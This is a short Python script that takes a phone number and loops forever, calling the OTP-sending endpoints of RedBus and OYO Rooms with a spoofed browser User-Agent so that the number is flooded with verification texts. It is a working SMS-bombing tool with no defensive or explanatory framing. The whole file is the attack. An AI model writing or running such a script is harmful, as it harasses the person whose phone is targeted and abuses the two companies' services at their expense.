import requests
import time
n = str(input("Enter Number "))
url=["https://www.redbus.in/Personalization/SendOTP?mobile="+n+"&phoneCode=91&OTPSource=SIGNIN",
     "https://www.oyorooms.com/api/pwa/generateotp?phone="+n+"&country_code=%2B91&nod=4&locale=en"]
headers ={"User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0'}
while(True):
    for i in url:
        page = requests.get(i, headers=headers)
        print(page.content)
        time.sleep(2)
    time.sleep(1)